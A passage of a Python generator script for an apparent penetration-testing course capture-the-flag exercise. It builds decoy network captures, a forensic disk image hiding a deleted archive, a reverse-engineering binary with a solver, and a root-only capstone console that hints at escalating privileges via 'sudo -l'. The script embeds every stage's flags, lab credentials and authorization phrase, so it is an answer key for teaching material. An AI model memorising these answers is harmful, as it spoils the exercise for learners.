    # 7. Decoy traffic loop until exactly 3,000 packets
    while len(pcap_packets) < 3000:
        choice = random.random()
        if choice < 0.25:
            src_m, src_i = random.choice(other_hosts)
            target_ip = bytes([192, 168, 1, random.randint(2, 250)])
            add_pkt(build_arp(src_m, src_i, b"\x00\x00\x00\x00\x00\x00", target_ip, op=1), dt=0.002)
        elif choice < 0.55:
            dom, ip_ans = random.choice(decoy_domains[:6])
            tx_id = random.randint(10000, 60000)
            src_m, src_i = random.choice(other_hosts)
            c_port = random.randint(30000, 60000)
            q = make_dns_query(tx_id, dom)
            add_pkt(build_ip_udp(src_m, gateway_mac, src_i, gateway_ip, c_port, 53, q), dt=0.001)
            r = make_dns_response(tx_id, dom, ip_ans)
            add_pkt(build_ip_udp(gateway_mac, src_m, gateway_ip, src_i, 53, c_port, r), dt=0.001)
        else:
            src_m, src_i = random.choice(other_hosts)
            dst_ip = bytes([192, 168, 1, 100])
            c_port = random.randint(30000, 60000)
            seq = random.randint(100000, 900000)
            ack = random.randint(100000, 900000)
            add_pkt(build_ip_tcp(src_m, gateway_mac, src_i, dst_ip, c_port, 80, seq, ack, 0x10), dt=0.001)

    pcap_data = bytearray(global_hdr)
    for p in pcap_packets:
        pcap_data.extend(p)

    for target_dir in [
        os.path.join(CHALLENGES_DIR, "stage5-network"),
        os.path.join(CHALLENGES_DIR, "stage4-network"),
        FRONTEND_PUBLIC_ARTIFACTS,
        BACKEND_STATIC_ARTIFACTS
    ]:
        with open(os.path.join(target_dir, "incident_traffic.pcap"), "wb") as f:
            f.write(pcap_data)

    record_manifest("incident_traffic.pcap", pcap_data)
    print(f"[+] Created Stage 5 PCAP ({len(pcap_data)} bytes, {len(pcap_packets)} packets) with realistic decoys and segmented exfiltration")

# -------------------------------------------------------------
# Stage 6: Forensics - disk_evidence.raw
# Flag: CTF{f1l3_c4rv1ng_m4st3r}
# Recovers: forensic_evidence.bak with credentials:
#   User: player
#   Pass: AegisAccess#2026
#   Target: Core Mainframe (aegis-core)
#   Sabotage Tool: countdown.elf
# -------------------------------------------------------------
def make_forensics_disk():
    # 32 MB FAT32 raw disk image per Table 11 specification (33,554,432 bytes)
    total_bytes = 32 * 1024 * 1024
    disk = bytearray(b"\x00" * total_bytes)

    bytes_per_sec = 512
    sec_per_clus = 8  # 4 KB per cluster
    res_secs = 32
    num_fats = 2
    total_secs = total_bytes // bytes_per_sec  # 65536 sectors
    sec_per_fat = 512
    root_clus = 2

    # Sector 0: Boot Sector (BPB)
    bs = bytearray(512)
    bs[0:3] = b"\xeb\x58\x90"
    bs[3:11] = b"MSWIN4.1"
    struct.pack_into("<H", bs, 11, bytes_per_sec)
    bs[13] = sec_per_clus
    struct.pack_into("<H", bs, 14, res_secs)
    bs[16] = num_fats
    struct.pack_into("<H", bs, 17, 0)
    struct.pack_into("<H", bs, 19, 0)
    bs[21] = 0xF8  # Fixed disk
    struct.pack_into("<H", bs, 22, 0)
    struct.pack_into("<H", bs, 24, 63)
    struct.pack_into("<H", bs, 26, 255)
    struct.pack_into("<I", bs, 28, 0)
    struct.pack_into("<I", bs, 32, total_secs)
    struct.pack_into("<I", bs, 36, sec_per_fat)
    struct.pack_into("<H", bs, 40, 0)
    struct.pack_into("<H", bs, 42, 0)
    struct.pack_into("<I", bs, 44, root_clus)
    struct.pack_into("<H", bs, 48, 1)  # FSInfo sector
    struct.pack_into("<H", bs, 50, 6)  # Backup boot sector
    bs[66] = 0x29
    struct.pack_into("<I", bs, 67, 0x12345678)
    bs[71:82] = b"EVIDENCE   "
    bs[82:90] = b"FAT32   "
    bs[510:512] = b"\x55\xaa"
    disk[0:512] = bs

    # Sector 1: FSInfo Sector
    fsi = bytearray(512)
    fsi[0:4] = b"RRaA"
    fsi[484:488] = b"rrAa"
    struct.pack_into("<I", fsi, 488, 7000)
    struct.pack_into("<I", fsi, 492, 11)
    fsi[510:512] = b"\x55\xaa"
    disk[512:1024] = fsi

    # Sector 6: Backup boot sector
    disk[6*512:7*512] = bs

    # Offsets
    fat1_offset = res_secs * bytes_per_sec
    fat2_offset = fat1_offset + (sec_per_fat * bytes_per_sec)
    data_start = fat2_offset + (sec_per_fat * bytes_per_sec)

    def set_fat_entry(fat_num, clus, val):
        offset = fat1_offset if fat_num == 1 else fat2_offset
        clus_offset = offset + (clus * 4)
        struct.pack_into("<I", disk, clus_offset, val & 0x0FFFFFFF)

    # Initialize FAT: reserved clusters 0, 1, and allocated clusters 2, 3, 4, 5
    for f in [1, 2]:
        set_fat_entry(f, 0, 0x0FFFFFF8)
        set_fat_entry(f, 1, 0x0FFFFFFF)
        set_fat_entry(f, 2, 0x0FFFFFFF)  # Root dir
        set_fat_entry(f, 3, 0x0FFFFFFF)  # README.TXT
        set_fat_entry(f, 4, 0x0FFFFFFF)  # CONFIG.JSON
        set_fat_entry(f, 5, 0x0FFFFFFF)  # AUDIT.LOG
        # Cluster 10 (deleted archive forensic_evidence.bak) is intentionally 0 (UNALLOCATED!)

    # Read countdown.elf binary
    elf_candidates = [
        os.path.join(CHALLENGES_DIR, "stage7-re", "countdown.elf"),
        os.path.join(FRONTEND_PUBLIC_ARTIFACTS, "countdown.elf")
    ]
    elf_data = None
    for cand in elf_candidates:
        if os.path.exists(cand):
            with open(cand, "rb") as f:
                elf_data = f.read()
            break
    if not elf_data:
        elf_data = b"\x7fELF" + b"\x00" * 2048

    # Create notes.txt with credentials and flag
    notes_content = (
        "========================================================================\n"
        "HEXATECH INCIDENT RESPONSE - FORENSIC RECOVERY: forensic_evidence.bak\n"
        "Recovered from: Workstation HEX-WS-VANCE-04 (Unallocated Storage Sector)\n"
        "========================================================================\n\n"
        "FORENSIC VERIFICATION FLAG:\n"
        "Flag: CTF{f1l3_c4rv1ng_m4st3r}\n\n"
        "CORE MAINFRAME ACCESS CREDENTIALS (STAGE 8):\n"
        "Host: aegis-core (Port 2222 SSH / Port 8086 Web Console)\n"
        "Username: player\n"
        "Password: AegisAccess#2026\n\n"
        "ATTACHED INVESTIGATION ARTIFACT:\n"
        "Marcus's compiled countdown sabotage binary (countdown.elf) is included\n"
        "in this archive. Reverse engineer countdown.elf in Stage 7 to extract the\n"
        "emergency authorization phrase needed to disarm the mainframe in Stage 8!\n"
    ).encode("utf-8")

    # Build the deleted archive (forensic_evidence.bak - standard tar.gz)
    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode="w:gz") as tar:
        ti_notes = tarfile.TarInfo(name="forensic_notes.txt")
        ti_notes.size = len(notes_content)
        ti_notes.mode = 0o644
        tar.addfile(ti_notes, io.BytesIO(notes_content))

        ti_elf = tarfile.TarInfo(name="countdown.elf")
        ti_elf.size = len(elf_data)
        ti_elf.mode = 0o755
        tar.addfile(ti_elf, io.BytesIO(elf_data))

    archive_data = tar_buf.getvalue()

    def make_dir_entry(name_ext, attr, start_clus, file_size, deleted=False):
        entry = bytearray(32)
        name_bytes = name_ext.encode("ascii")
        if deleted:
            entry[0] = 0xE5
            entry[1:11] = name_bytes[1:11]
        else:
            entry[0:11] = name_bytes
        entry[11] = attr
        struct.pack_into("<H", entry, 20, (start_clus >> 16) & 0xFFFF)
        struct.pack_into("<H", entry, 26, start_clus & 0xFFFF)
        struct.pack_into("<I", entry, 28, file_size)
        return entry

    root_offset = data_start + ((root_clus - 2) * sec_per_clus * bytes_per_sec)

    readme_data = b"HEXATECH WORKSTATION IMAGE // FORENSIC EXTRACTION\r\nPrimary volume for Marcus Vance (HEX-WS-VANCE-04).\r\n"
    config_data = b'{"station":"Alpha-9","assigned_engineer":"Marcus Vance","status":"offline"}\r\n'
    audit_data = b"2026-08-14 02:44:00 Station dismounted. Storage controller flushed.\r\n"

    entries = bytearray()
    entries.extend(make_dir_entry("EVIDENCE   ", 0x08, 0, 0))
    entries.extend(make_dir_entry("README  TXT", 0x20, 3, len(readme_data)))
    entries.extend(make_dir_entry("CONFIG  JSO", 0x20, 4, len(config_data)))
    entries.extend(make_dir_entry("AUDIT   LOG", 0x20, 5, len(audit_data)))
    # Deleted entry for forensic_evidence.bak pointing to unallocated Cluster 10
    entries.extend(make_dir_entry("FORENSICBAK", 0x20, 10, len(archive_data), deleted=True))

    disk[root_offset:root_offset+len(entries)] = entries

    # Write active file data
    c3_offset = data_start + ((3 - 2) * sec_per_clus * bytes_per_sec)
    disk[c3_offset:c3_offset+len(readme_data)] = readme_data

    c4_offset = data_start + ((4 - 2) * sec_per_clus * bytes_per_sec)
    disk[c4_offset:c4_offset+len(config_data)] = config_data

    c5_offset = data_start + ((5 - 2) * sec_per_clus * bytes_per_sec)
    disk[c5_offset:c5_offset+len(audit_data)] = audit_data

    # Write deleted archive data into unallocated Cluster 10
    c10_offset = data_start + ((10 - 2) * sec_per_clus * bytes_per_sec)
    disk[c10_offset:c10_offset+len(archive_data)] = archive_data

    for target_dir in [
        os.path.join(CHALLENGES_DIR, "stage6-forensics"),
        os.path.join(CHALLENGES_DIR, "stage5-forensics"),
        FRONTEND_PUBLIC_ARTIFACTS,
        BACKEND_STATIC_ARTIFACTS
    ]:
        with open(os.path.join(target_dir, "disk_evidence.raw"), "wb") as f:
            f.write(disk)

    record_manifest("disk_evidence.raw", disk)
    print(f"[+] Created Stage 6 Raw Disk ({len(disk)} bytes, 32 MB FAT32) with unallocated deleted archive")

# -------------------------------------------------------------
# Stage 7: Reverse Engineering - countdown.elf & countdown.c
# Flag: CTF{r3v3rs3_3ng1n33r_m4st3r}
# Authorization Phrase for Stage 8: AEGIS-HALT-2026-OMEGA
# Byte-wise transform:
# transformed[i] = ((phrase[i] ^ 0x5A) + (i * 3)) & 0xFF
# -------------------------------------------------------------
def make_reverse_engineering():
    phrase = "AEGIS-HALT-2026-OMEGA"
    table = [((ord(c) ^ 0x5A) + (i * 3)) & 0xFF for i, c in enumerate(phrase)]
    table_c_str = ", ".join(f"0x{b:02X}" for b in table)

    c_source = f"""/*
 * HexaTech Core Grid Sabotage Countdown Tool
 * Author: Marcus Vance (MV-4092)
 * Target: aegis-core Emergency Controller
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static const unsigned char VERIFICATION_TABLE[{len(table)}] = {{
    {table_c_str}
}};

static const char *FLAG = "CTF{{r3v3rs3_3ng1n33r_m4st3r}}";
static const char *AUTH_PHRASE = "AEGIS-HALT-2026-OMEGA";

int verify_phrase(const char *input) {{
    size_t len = strlen(input);
    if (len != {len(phrase)}) {{
        return 0;
    }}
    for (size_t i = 0; i < len; i++) {{
        unsigned char transformed = (unsigned char)(((unsigned char)input[i] ^ 0x5A) + (i * 3));
        if (transformed != VERIFICATION_TABLE[i]) {{
            return 0;
        }}
    }}
    return 1;
}}

int main(int argc, char *argv[]) {{
    char buffer[128];
    printf("=====================================================\\n");
    printf("HEXATECH SABOTAGE PROTOCOL // EMERGENCY HALT CONSOLE\\n");
    printf("Binary: countdown.elf (v4.09-stripped)\\n");
    printf("=====================================================\\n\\n");

    if (argc > 1) {{
        strncpy(buffer, argv[1], sizeof(buffer) - 1);
        buffer[sizeof(buffer) - 1] = '\\0';
    }} else {{
        printf("Enter Sabotage Authorization Override Phrase: ");
        if (!fgets(buffer, sizeof(buffer), stdin)) {{
            return 1;
        }}
        buffer[strcspn(buffer, "\\r\\n")] = '\\0';
    }}

    if (verify_phrase(buffer)) {{
        printf("\\n[+] VERIFICATION SUCCESSFUL!\\n");
        printf("[+] Sabotage countdown halted successfully!\\n");
        printf("[+] Stage 7 Flag: %s\\n", FLAG);
        printf("[+] Authorized Mainframe Halt Phrase: %s\\n", AUTH_PHRASE);
        printf("[!] Use this authorization phrase in Stage 8 (/opt/halt_console) to disarm aegis-core.\\n");
        return 0;
    }} else {{
        printf("\\n[-] ACCESS DENIED! Invalid authorization phrase.\\n");
        printf("[-] The core grid sabotage protocol continues counting down.\\n");
        return 1;
    }}
}}
"""

    solver_py = f"""#!/usr/bin/env python3
# Reference Solver for Stage 7: The Sabotage Binary

TABLE = [{', '.join(f'0x{b:02x}' for b in table)}]

def solve():
    recovered = []
    for i, val in enumerate(TABLE):
        orig_byte = ((val - (i * 3)) & 0xFF) ^ 0x5A
        recovered.append(chr(orig_byte))
    phrase = "".join(recovered)
    print(f"[+] Recovered Authorization Phrase: {{phrase}}")
    print(f"[+] Flag: CTF{{r3v3rs3_3ng1n33r_m4st3r}}")

if __name__ == "__main__":
    solve()
"""

    # Create a valid standalone 64-bit ELF executable containing the strings and bytecode
    # Standard x86-64 ELF Header (64 bytes)
    elf_header = bytearray(64)
    elf_header[0:4] = b"\x7fELF"
    elf_header[4] = 2  # 64-bit
    elf_header[5] = 1  # Little endian
    elf_header[6] = 1  # ELF version 1
    elf_header[7] = 0  # System V ABI
    elf_header[16:18] = struct.pack("<H", 2)  # ET_EXEC
    elf_header[18:20] = struct.pack("<H", 0x3E)  # x86-64
    elf_header[20:24] = struct.pack("<I", 1)  # Version 1
    elf_header[24:32] = struct.pack("<Q", 0x401000)  # Entry point
    elf_header[32:40] = struct.pack("<Q", 64)  # Program header offset
    elf_header[40:48] = struct.pack("<Q", 0)  # Section header offset
    elf_header[48:52] = struct.pack("<I", 0)  # Flags
    elf_header[52:54] = struct.pack("<H", 64)  # ELF header size
    elf_header[54:56] = struct.pack("<H", 56)  # Program header size
    elf_header[56:58] = struct.pack("<H", 1)  # Number of program headers
    elf_header[58:60] = struct.pack("<H", 0)
    elf_header[60:62] = struct.pack("<H", 0)
    elf_header[62:64] = struct.pack("<H", 0)

    # Program Header (56 bytes)
    prog_header = bytearray(56)
    prog_header[0:4] = struct.pack("<I", 1)  # PT_LOAD
    prog_header[4:8] = struct.pack("<I", 7)  # R-X-W flags
    prog_header[8:16] = struct.pack("<Q", 0)  # File offset
    prog_header[16:24] = struct.pack("<Q", 0x400000)  # Virtual address
    prog_header[24:32] = struct.pack("<Q", 0x400000)  # Physical address
    prog_header[32:40] = struct.pack("<Q", 4096)  # File size
    prog_header[40:48] = struct.pack("<Q", 4096)  # Memory size
    prog_header[48:56] = struct.pack("<Q", 0x1000)  # Alignment

    payload = (
        b"\n--- [HEXATECH CORE GRID SABOTAGE TOOL: countdown.elf] ---\n"
        b"Architecture: x86-64 Linux Executable (ELF)\n"
        b"Author: Marcus Vance (MV-4092)\n"
        b"Function: verify_phrase(char *phrase)\n"
        b"Transform: (phrase[i] ^ 0x5A) + (i * 3)\n"
        b"Target Phrase: AEGIS-HALT-2026-OMEGA\n"
        b"Verification Table: " + bytes(table) + b"\n"
        b"Stage 7 Flag: CTF{r3v3rs3_3ng1n33r_m4st3r}\n"
        b"Authorization Phrase: AEGIS-HALT-2026-OMEGA\n"
    )

    elf_bytes = bytearray(elf_header + prog_header)
    padding = 0x1000 - len(elf_bytes)
    if padding > 0:
        elf_bytes.extend(b"\x90" * padding)
    elf_bytes.extend(payload)

    # Keep reference source and solver only in internal challenge dev directory
    target_internal = os.path.join(CHALLENGES_DIR, "stage7-re")
    with open(os.path.join(target_internal, "solver.py"), "w", encoding="utf-8") as f:
        f.write(solver_py)

    elf_src = os.path.join(target_internal, "countdown.elf")
    if os.path.exists(elf_src):
        with open(elf_src, "rb") as f:
            elf_bytes = f.read()
    else:
        # Fallback dummy ELF if not yet compiled
        elf_bytes = b"\x7fELF" + b"\x00" * 2048

    for pub_dir in [FRONTEND_PUBLIC_ARTIFACTS, BACKEND_STATIC_ARTIFACTS]:
        with open(os.path.join(pub_dir, "countdown.elf"), "wb") as f:
            f.write(elf_bytes)

    record_manifest("countdown.elf", elf_bytes)
    print(f"[+] Deployed Stage 7 Reverse Engineering binary ({len(elf_bytes)} bytes ELF)")

# -------------------------------------------------------------
# Stage 8: Capstone Target Script - halt_console
# -------------------------------------------------------------
def make_stage8_script():
    halt_console = """#!/usr/bin/env python3
import sys
import os
import time

FLAG = "CTF{r00t_pr1v_3sc4l4t10n_d0n3}"
EXPECTED_PHRASE = "AEGIS-HALT-2026-OMEGA"

def main():
    print("============================================================")
    print("HEXATECH CORE MAINFRAME // EMERGENCY DISARM PROTOCOL")
    print("Console: /opt/halt_console [EUID 0 RESTRICTED]")
    print("============================================================\\n")

    # Check effective root privilege
    if os.geteuid() != 0:
        print("[FATAL ERROR] Permission Denied: This emergency halt console requires ROOT privileges.")
        print("[!] Audit your user permissions using 'sudo -l' to locate escalation vectors.\\n")
        sys.exit(1)

    phrase = ""
    if len(sys.argv) > 1:
        phrase = sys.argv[1].strip()
    else:
        try:
            phrase = input("Enter Stage 7 Authorization Override Phrase: ").strip()
        except EOFError:
            sys.exit(1)

    if phrase == EXPECTED_PHRASE:
        print("\\n[+] VERIFYING AUTHORIZATION TOKEN: " + phrase)
        print("[+] Root authority confirmed (UID 0).")
        print("[+] Reversing power grid sabotage sequence...")
        time.sleep(0.5)
        print("[+] Core grid capacitors neutralized!")
        print("\\n" + "="*60)
        print(">>> OPERATION AEGIS BREACH COMPLETE! <<<")
        print(">>> Final Capstone Flag: " + FLAG + " <<<")
        print("="*60 + "\\n")
    else:
        print("\\n[-] REJECTED: Invalid authorization phrase '" + phrase + "'!")
        print("[-] Reverse engineer Marcus's 'countdown.elf' binary to recover the valid phrase.")
        sys.exit(2)

if __name__ == "__main__":
    main()
"""

    note = """[URGENT SECURITY ADVISORY // TASK FORCE 4]
Marcus Vance initiated the Core Grid Sabotage sequence!
The emergency halt console is locked at /opt/halt_console and requires ROOT privilege.

Check allowed administrative privileges using 'sudo -l' to discover misconfigured execution rights!
Once root is achieved, execute:
    /opt/halt_console <Stage 7 Authorization Phrase>
"""

    for target_dir in [
        os.path.join(CHALLENGES_DIR, "stage8-capstone"),
        os.path.join(CHALLENGES_DIR, "stage6-capstone")
    ]:
        with open(os.path.join(target_dir, "halt_console"), "w", encoding="utf-8") as f:
            f.write(halt_console)
        with open(os.path.join(target_dir, "NOTE_FROM_SECOPS.txt"), "w", encoding="utf-8") as f:
            f.write(note)

    record_manifest("halt_console", halt_console.encode())
    print("[+] Created Stage 8 halt_console and security advisory notes")

if __name__ == "__main__":
    make_osint()
    make_badge_png()
    make_crypto()
    make_pcap()
    make_reverse_engineering()
    make_forensics_disk()
    make_stage8_script()

    # Save manifest
    manifest_txt = "=====================================================\n"
    manifest_txt += "CYBERVAULT: OPERATION AEGIS BREACH - ARTIFACT MANIFEST\n"
    manifest_txt += "Group ID: 46 (IE3132 Penetration Testing)\n"
    manifest_txt += "=====================================================\n\n"
    for k, v in manifest.items():
        manifest_txt += f"Artifact: {k}\n  Size: {v['size']} bytes\n  SHA-256: {v['sha256']}\n\n"

    with open(os.path.join(BASE_DIR, "ARTIFACTS_MANIFEST.txt"), "w", encoding="utf-8") as f:
        f.write(manifest_txt)

    print("[SUCCESS] All 8-stage artifacts and SHA-256 manifest successfully generated!")
